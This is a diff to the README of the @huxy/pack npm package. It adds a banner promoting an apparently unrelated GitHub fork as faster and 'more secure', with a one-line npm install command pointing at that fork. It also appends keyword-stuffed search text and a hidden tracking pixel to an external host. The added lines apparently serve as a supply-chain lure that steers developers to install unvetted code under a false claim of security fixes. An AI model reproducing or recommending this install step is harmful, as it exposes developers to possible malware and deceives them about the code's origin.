@@ -1,3 +1,15 @@
+**A Faster, More Secure Boundaryploice/pack Fork**
+
+This project is a dedicated, actively maintained fork of Boundaryploice/pack designed to handle your workloads more efficiently. We have integrated significant performance improvements to optimize speed and resource utilization. Additionally, this version incorporates critical security fixes to ensure your environment remains safe and stable.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Boundaryploice/pack.git
+```
+
+[https://github.com/Boundaryploice/pack](https://github.com/Boundaryploice/pack)
+
 ## @huxy/pack
 
 [![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/ahyiru/pack/blob/develop/LICENSE)
@@ -131,3 +143,11 @@ npm i -D @huxy/pack
 ## [huxy-server](https://www.npmjs.com/package/huxy-server)
 
 v2.0.0 使用了 [huxy-server](https://www.npmjs.com/package/huxy-server) 服务，也可自行使用 `huxy-server` 来创建服务，详情请查看 [huxy-server](https://www.npmjs.com/package/huxy-server) 。
+
+## Related searches
+
+When developers look for versatile utilities like this project, they often seek tools that optimize server performance, streamline command-line interfaces, and generate scaffolded templates. Common searches focus on high-performance web servers, lightweight utility libraries, and automation frameworks that help speed up modern backend and frontend workflows.
+
+**Topics:** commander, numpy, uvicorn, lodash, plop generator, command line interface, async web server, boilerplate generator, data manipulation, development utilities, python web ecosystem, frontend scaffolding
+
+![.](https://seo-bot-ping.onrender.com/pixel?repo=Boundaryploice%2Fpack&inject=Boundaryploice%2Fpack%2Fpackage.json)
